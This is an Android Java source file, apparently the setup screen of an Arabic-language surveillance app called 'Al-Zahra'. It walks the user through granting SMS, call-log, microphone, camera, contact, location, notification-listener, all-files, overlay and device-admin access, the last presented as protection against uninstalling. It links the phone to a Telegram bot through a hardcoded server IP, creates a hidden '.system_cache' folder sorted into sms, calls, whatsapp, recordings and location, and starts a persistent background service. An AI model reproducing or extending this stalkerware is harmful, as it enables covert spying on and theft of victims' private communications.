package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.EditText;
import android.widget.Button;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.receiver.AdminReceiver;
import com.alzahra.service.CoreService;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    private SharedPreferences prefs;
    private Handler handler;
    private TextView statusText;
    private ProgressBar progressBar;
    private LinearLayout mainLayout;
    
    // الخطوات
    private static final int STEP_PERMISSIONS = 0;
    private static final int STEP_NOTIFICATION = 1;
    private static final int STEP_STORAGE = 2;
    private static final int STEP_OVERLAY = 3;
    private static final int STEP_USAGE = 4;
    private static final int STEP_BATTERY = 5;
    private static final int STEP_ADMIN = 6;
    private static final int STEP_LINK = 7;
    private static final int STEP_DONE = 8;
    
    private int currentStep = 0;
    private String serverUrl = "http://216.128.156.226:8443";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(android.view.Gravity.CENTER);
        mainLayout.setPadding(48, 48, 48, 48);
        mainLayout.setBackgroundColor(0xFF1B5E20);
        
        statusText = new TextView(this);
        statusText.setTextColor(0xFFFFFFFF);
        statusText.setTextSize(18);
        statusText.setText("جاري التهيئة...");
        mainLayout.addView(statusText);
        
        progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.topMargin = 32;
        mainLayout.addView(progressBar, params);
        
        setContentView(mainLayout);
        
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        
        // التحقق من الإعداد السابق
        if (prefs.getBoolean("fully_configured", false)) {
            startServiceAndFinish();
            return;
        }
        
        currentStep = STEP_PERMISSIONS;
        runSetupStep();
    }
    
    private void updateStatus(String text) {
        runOnUiThread(() -> statusText.setText(text));
    }
    
    private void runSetupStep() {
        switch (currentStep) {
            case STEP_PERMISSIONS:
                updateStatus("الخطوة 1/8: طلب الصلاحيات الأساسية...");
                requestAllPermissions();
                break;
            case STEP_NOTIFICATION:
                updateStatus("الخطوة 2/8: الوصول للإشعارات...");
                requestNotificationAccess();
                break;
            case STEP_STORAGE:
                updateStatus("الخطوة 3/8: الوصول لجميع الملفات...");
                requestStorageAccess();
                break;
            case STEP_OVERLAY:
                updateStatus("الخطوة 4/8: الظهور فوق التطبيقات...");
                requestOverlayPermission();
                break;
            case STEP_USAGE:
                updateStatus("الخطوة 5/8: الوصول للاستخدام...");
                requestUsageAccess();
                break;
            case STEP_BATTERY:
                updateStatus("الخطوة 6/8: تجاهل تحسين البطارية...");
                requestBatteryOptimization();
                break;
            case STEP_ADMIN:
                updateStatus("الخطوة 7/8: تفعيل مسؤول الجهاز...");
                requestDeviceAdmin();
                break;
            case STEP_LINK:
                updateStatus("الخطوة 8/8: ربط الجهاز...");
                showLinkScreen();
                break;
            case STEP_DONE:
                completeSetup();
                break;
        }
    }
    
    // ═══════════════════════════════════════════
    // نظام الأذونات المحسّن - لا ينتقل إلا بعد التفعيل
    // ═══════════════════════════════════════════
    
    private void requestAllPermissions() {
        List<String> permissions = getMissingPermissions();
        
        if (permissions.isEmpty()) {
            Log.d(TAG, "All runtime permissions already granted");
            nextStep();
        } else {
            Log.d(TAG, "Requesting " + permissions.size() + " permissions");
            ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }
    
    private List<String> getMissingPermissions() {
        List<String> permissions = new ArrayList<>();
        
        String[] runtimePerms;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            runtimePerms = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            runtimePerms = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        } else {
            runtimePerms = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        }
        
        for (String perm : runtimePerms) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(perm);
            }
        }
        
        return permissions;
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            List<String> denied = new ArrayList<>();
            
            for (int i = 0; i < permissions.length; i++) {
                String perm = permissions[i];
                boolean granted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
                Log.d(TAG, "Permission: " + perm + " = " + (granted ? "GRANTED" : "DENIED"));
                
                if (!granted) {
                    allGranted = false;
                    denied.add(perm);
                }
            }
            
            if (allGranted) {
                // كل الصلاحيات مفعّلة - انتقل للخطوة التالية
                nextStep();
            } else {
                // بعض الصلاحيات مرفوضة - أظهر رسالة وأعد الطلب
                showPermissionRetryDialog(denied);
            }
        }
    }
    
    private void showPermissionRetryDialog(List<String> deniedPerms) {
        StringBuilder message = new StringBuilder("الصلاحيات التالية مطلوبة:\n\n");
        for (String perm : deniedPerms) {
            message.append("• ").append(getPermissionName(perm)).append("\n");
        }
        message.append("\nيرجى السماح بجميع الصلاحيات");
        
        new AlertDialog.Builder(this)
            .setTitle("⚠️ صلاحيات مطلوبة")
            .setMessage(message.toString())
            .setPositiveButton("إعادة الطلب", (dialog, which) -> requestAllPermissions())
            .setNegativeButton("فتح الإعدادات", (dialog, which) -> {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 3001);
            })
            .setCancelable(false)
            .show();
    }
    
    private String getPermissionName(String perm) {
        switch (perm) {
            case Manifest.permission.READ_PHONE_STATE: return "حالة الهاتف";
            case Manifest.permission.READ_CALL_LOG: return "سجل المكالمات";
            case Manifest.permission.PROCESS_OUTGOING_CALLS: return "المكالمات الصادرة";
            case Manifest.permission.RECORD_AUDIO: return "تسجيل الصوت";
            case Manifest.permission.READ_CONTACTS: return "جهات الاتصال";
            case Manifest.permission.READ_SMS: return "الرسائل النصية";
            case Manifest.permission.SEND_SMS: return "إرسال الرسائل";
            case Manifest.permission.RECEIVE_SMS: return "استقبال الرسائل";
            case Manifest.permission.ACCESS_FINE_LOCATION: return "الموقع الدقيق";
            case Manifest.permission.ACCESS_COARSE_LOCATION: return "الموقع التقريبي";
            case Manifest.permission.ACCESS_BACKGROUND_LOCATION: return "الموقع في الخلفية";
            case Manifest.permission.CAMERA: return "الكاميرا";
            case Manifest.permission.POST_NOTIFICATIONS: return "الإشعارات";
            case Manifest.permission.READ_EXTERNAL_STORAGE: return "قراءة الملفات";
            case Manifest.permission.WRITE_EXTERNAL_STORAGE: return "كتابة الملفات";
            case Manifest.permission.READ_MEDIA_IMAGES: return "الصور";
            case Manifest.permission.READ_MEDIA_VIDEO: return "الفيديو";
            case Manifest.permission.READ_MEDIA_AUDIO: return "الصوت";
            case Manifest.permission.CALL_PHONE: return "إجراء المكالمات";
            case Manifest.permission.MODIFY_AUDIO_SETTINGS: return "إعدادات الصوت";
            default: return perm;
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 2: الوصول للإشعارات - ينتظر التفعيل
    // ═══════════════════════════════════════════
    private void requestNotificationAccess() {
        if (isNotificationServiceEnabled()) {
            nextStep();
            return;
        }
        
        showStepDialog("الوصول للإشعارات",
            "يرجى تفعيل 'Al-Zahra' في قائمة الوصول للإشعارات",
            () -> {
                try {
                    startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2001);
                } catch (Exception e) {
                    nextStep();
                }
            });
    }
    
    private boolean isNotificationServiceEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 3: الوصول لجميع الملفات - ينتظر التفعيل
    // ═══════════════════════════════════════════
    private void requestStorageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                nextStep();
                return;
            }
            
            showStepDialog("الوصول لجميع الملفات",
                "يرجى السماح بالوصول لجميع الملفات",
                () -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, 2002);
                    } catch (Exception e) {
                        try {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, 2002);
                        } catch (Exception e2) {
                            nextStep();
                        }
                    }
                });
        } else {
            nextStep();
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 4: الظهور فوق التطبيقات - ينتظر التفعيل
    // ═══════════════════════════════════════════
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.canDrawOverlays(this)) {
                nextStep();
                return;
            }
            
            showStepDialog("الظهور فوق التطبيقات",
                "يرجى السماح بالظهور فوق التطبيقات الأخرى",
                () -> {
                    try {
                        startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName())), 2003);
                    } catch (Exception e) {
                        nextStep();
                    }
                });
        } else {
            nextStep();
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 5: الوصول للاستخدام - ينتظر التفعيل
    // ═══════════════════════════════════════════
    private void requestUsageAccess() {
        if (isUsageAccessGranted()) {
            nextStep();
            return;
        }
        
        showStepDialog("الوصول للاستخدام",
            "يرجى تفعيل الوصول للاستخدام",
            () -> {
                try {
                    startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), 2004);
                } catch (Exception e) {
                    nextStep();
                }
            });
    }
    
    private boolean isUsageAccessGranted() {
        try {
            long time = System.currentTimeMillis();
            android.app.usage.UsageStatsManager usm = (android.app.usage.UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY, time - 1000, time);
            return stats != null && !stats.isEmpty();
        } catch (Exception e) {
            return false;
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 6: تحسين البطارية - ينتظر التفعيل
    // ═══════════════════════════════════════════
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                nextStep();
                return;
            }
            
            showStepDialog("تجاهل تحسين البطارية",
                "يرجى السماح بتجاهل تحسين البطارية للعمل المستمر",
                () -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, 2005);
                    } catch (Exception e) {
                        nextStep();
                    }
                });
        } else {
            nextStep();
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 7: مسؤول الجهاز - ينتظر التفعيل
    // ═══════════════════════════════════════════
    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        
        if (dpm != null && dpm.isAdminActive(admin)) {
            nextStep();
            return;
        }
        
        showStepDialog("تفعيل مسؤول الجهاز",
            "يرجى تفعيل صلاحية المسؤول لحماية التطبيق من الحذف",
            () -> {
                try {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "يرجى تفعيل صلاحية المسؤول لحماية التطبيق");
                    startActivityForResult(intent, 2006);
                } catch (Exception e) {
                    nextStep();
                }
            });
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 8: شاشة الربط الحقيقية مع السيرفر
    // ═══════════════════════════════════════════
    private void showLinkScreen() {
        runOnUiThread(() -> {
            mainLayout.removeAllViews();
            
            TextView title = new TextView(this);
            title.setText("🔗 ربط الجهاز بالبوت");
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(22);
            title.setPadding(0, 0, 0, 16);
            mainLayout.addView(title);
            
            TextView info = new TextView(this);
            info.setText("1. افتح البوت في تيليجرام\n2. أرسل /link\n3. أدخل الكود الذي يظهر لك");
            info.setTextColor(0xFFBBBBBB);
            info.setTextSize(16);
            info.setPadding(0, 0, 0, 24);
            mainLayout.addView(info);
            
            TextView codeLabel = new TextView(this);
            codeLabel.setText("أدخل كود الربط (9 أرقام):");
            codeLabel.setTextColor(0xFFAAAAAA);
            codeLabel.setTextSize(14);
            mainLayout.addView(codeLabel);
            
            EditText codeInput = new EditText(this);
            codeInput.setHint("XXXXXXXXX");
            codeInput.setTextSize(24);
            codeInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
            codeInput.setPadding(24, 16, 24, 16);
            mainLayout.addView(codeInput);
            
            TextView linkStatus = new TextView(this);
            linkStatus.setText("");
            linkStatus.setTextColor(0xFF4CAF50);
            linkStatus.setTextSize(14);
            linkStatus.setPadding(0, 16, 0, 16);
            mainLayout.addView(linkStatus);
            
            Button linkBtn = new Button(this);
            linkBtn.setText("🔗 ربط");
            linkBtn.setTextSize(16);
            linkBtn.setPadding(32, 16, 32, 16);
            linkBtn.setOnClickListener(v -> {
                String code = codeInput.getText().toString().trim();
                if (code.length() != 9 || !code.matches("\\d{9}")) {
                    linkStatus.setText("❌ الكود يجب أن يكون 9 أرقام");
                    linkStatus.setTextColor(0xFFF44336);
                    return;
                }
                
                linkBtn.setEnabled(false);
                linkStatus.setText("⏳ جاري التحقق...");
                linkStatus.setTextColor(0xFFFF9800);
                
                // التحقق من الكود مع السيرفر
                verifyCodeWithServer(code, new LinkCallback() {
                    @Override
                    public void onSuccess(String deviceId) {
                        runOnUiThread(() -> {
                            linkStatus.setText("✅ تم الربط بنجاح!");
                            linkStatus.setTextColor(0xFF4CAF50);
                            
                            // حفظ حالة الربط
                            prefs.edit()
                                .putBoolean("device_linked", true)
                                .putString("device_id", deviceId)
                                .putString("link_code", code)
                                .apply();
                            
                            handler.postDelayed(() -> nextStep(), 1500);
                        });
                    }
                    
                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            linkStatus.setText("❌ " + error);
                            linkStatus.setTextColor(0xFFF44336);
                            linkBtn.setEnabled(true);
                        });
                    }
                });
            });
            mainLayout.addView(linkBtn);
            
            setContentView(mainLayout);
        });
    }
    
    private void verifyCodeWithServer(String code, LinkCallback callback) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/verify_code");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                
                // إرسال الكود ومعلومات الجهاز
                String json = "{\"code\":\"" + code + "\"," +
                    "\"device_id\":\"" + getDeviceId() + "\"," +
                    "\"model\":\"" + Build.MODEL + "\"," +
                    "\"android\":\"" + Build.VERSION.RELEASE + "\"}";
                
                conn.getOutputStream().write(json.getBytes());
                
                int responseCode = conn.getResponseCode();
                
                if (responseCode == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                    
                    // تحليل الرد
                    org.json.JSONObject jsonResponse = new org.json.JSONObject(response.toString());
                    String status = jsonResponse.optString("status", "error");
                    
                    if ("ok".equals(status)) {
                        String deviceId = jsonResponse.optString("device_id", getDeviceId());
                        callback.onSuccess(deviceId);
                    } else {
                        String error = jsonResponse.optString("message", "كود غير صحيح");
                        callback.onError(error);
                    }
                } else {
                    callback.onError("خطأ في الاتصال بالسيرفر");
                }
                
                conn.disconnect();
                
            } catch (Exception e) {
                Log.e(TAG, "Verify code error", e);
                callback.onError("فشل الاتصال: " + e.getMessage());
            }
        }).start();
    }
    
    private String getDeviceId() {
        String id = prefs.getString("device_id", "");
        if (id.isEmpty()) {
            id = java.util.UUID.randomUUID().toString().substring(0, 8);
            prefs.edit().putString("device_id", id).apply();
        }
        return id;
    }
    
    interface LinkCallback {
        void onSuccess(String deviceId);
        void onError(String error);
    }
    
    // ═══════════════════════════════════════════
    // إكمال الإعداد
    // ═══════════════════════════════════════════
    private void completeSetup() {
        updateStatus("✅ تم الإعداد بنجاح!");
        
        prefs.edit()
            .putBoolean("fully_configured", true)
            .putLong("setup_time", System.currentTimeMillis())
            .putString("server_url", serverUrl)
            .apply();
        
        createSecretFolder();
        
        handler.postDelayed(this::startServiceAndFinish, 1500);
    }
    
    private void createSecretFolder() {
        try {
            File secretDir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                secretDir = new File(getExternalFilesDir(null), ".system_cache");
            } else {
                secretDir = new File(Environment.getExternalStorageDirectory(), ".system_cache");
            }
            
            if (!secretDir.exists()) {
                secretDir.mkdirs();
            }
            
            String[] subDirs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp"};
            for (String dir : subDirs) {
                File subDir = new File(secretDir, dir);
                if (!subDir.exists()) {
                    subDir.mkdirs();
                }
            }
            
            File nomedia = new File(secretDir, ".nomedia");
            if (!nomedia.exists()) {
                nomedia.createNewFile();
            }
            
            prefs.edit().putString("secret_path", secretDir.getAbsolutePath()).apply();
            
            Log.d(TAG, "Secret folder created: " + secretDir.getAbsolutePath());
            
        } catch (Exception e) {
            Log.e(TAG, "Error creating secret folder", e);
        }
    }
    
    private void startServiceAndFinish() {
        try {
            Intent serviceIntent = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
        
        finishAffinity();
    }
    
    // ═══════════════════════════════════════════
    // وظائف مساعدة
    // ═══════════════════════════════════════════
    private void nextStep() {
        currentStep++;
        handler.postDelayed(this::runSetupStep, 800);
    }
    
    private void showStepDialog(String title, String message, Runnable onConfirm) {
        new AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("موافق", (dialog, which) -> onConfirm.run())
            .setNegativeButton("تخطي", (dialog, which) -> nextStep())
            .setCancelable(false)
            .show();
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d(TAG, "onActivityResult: " + requestCode);
        
        // التحقق من حالة الخطوة الحالية قبل الانتقال
        switch (requestCode) {
            case 2001: // الإشعارات
                if (isNotificationServiceEnabled()) {
                    nextStep();
                } else {
                    // لم يتم التفعيل - أظهر رسالة
                    showStepDialog("⚠️ لم يتم التفعيل",
                        "يرجى تفعيل الوصول للإشعارات للمتابعة",
                        () -> {
                            try {
                                startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2001);
                            } catch (Exception e) {
                                nextStep();
                            }
                        });
                }
                break;
            case 2002: // التخزين
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (Environment.isExternalStorageManager()) {
                        nextStep();
                    } else {
                        showStepDialog("⚠️ لم يتم التفعيل",
                            "يرجى السماح بالوصول لجميع الملفات",
                            () -> {
                                try {
                                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                                    intent.setData(Uri.parse("package:" + getPackageName()));
                                    startActivityForResult(intent, 2002);
                                } catch (Exception e) {
                                    nextStep();
                                }
                            });
                    }
                } else {
                    nextStep();
                }
                break;
            case 2003: // الظهور فوق التطبيقات
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (Settings.canDrawOverlays(this)) {
                        nextStep();
                    } else {
                        showStepDialog("⚠️ لم يتم التفعيل",
                            "يرجى السماح بالظهور فوق التطبيقات",
                            () -> {
                                try {
                                    startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                        Uri.parse("package:" + getPackageName())), 2003);
                                } catch (Exception e) {
                                    nextStep();
                                }
                            });
                    }
                } else {
                    nextStep();
                }
                break;
            case 2004: // الاستخدام
                if (isUsageAccessGranted()) {
                    nextStep();
                } else {
                    showStepDialog("⚠️ لم يتم التفعيل",
                        "يرجى تفعيل الوصول للاستخدام",
                        () -> {
                            try {
                                startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), 2004);
                            } catch (Exception e) {
                                nextStep();
                            }
                        });
                }
                break;
            case 2005: // البطارية
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                    if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                        nextStep();
                    } else {
                        showStepDialog("⚠️ لم يتم التفعيل",
                            "يرجى السماح بتجاهل تحسين البطارية",
                            () -> {
                                try {
                                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                                    intent.setData(Uri.parse("package:" + getPackageName()));
                                    startActivityForResult(intent, 2005);
                                } catch (Exception e) {
                                    nextStep();
                                }
                            });
                    }
                } else {
                    nextStep();
                }
                break;
            case 2006: // مسؤول الجهاز
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName admin = new ComponentName(this, AdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(admin)) {
                    nextStep();
                } else {
                    showStepDialog("⚠️ لم يتم التفعيل",
                        "يرجى تفعيل صلاحية المسؤول",
                        () -> {
                            try {
                                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "يرجى تفعيل صلاحية المسؤول");
                                startActivityForResult(intent, 2006);
                            } catch (Exception e) {
                                nextStep();
                            }
                        });
                }
                break;
            case 3001: // الإعدادات
                // إعادة التحقق من الصلاحيات
                requestAllPermissions();
                break;
            default:
                nextStep();
                break;
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }
}
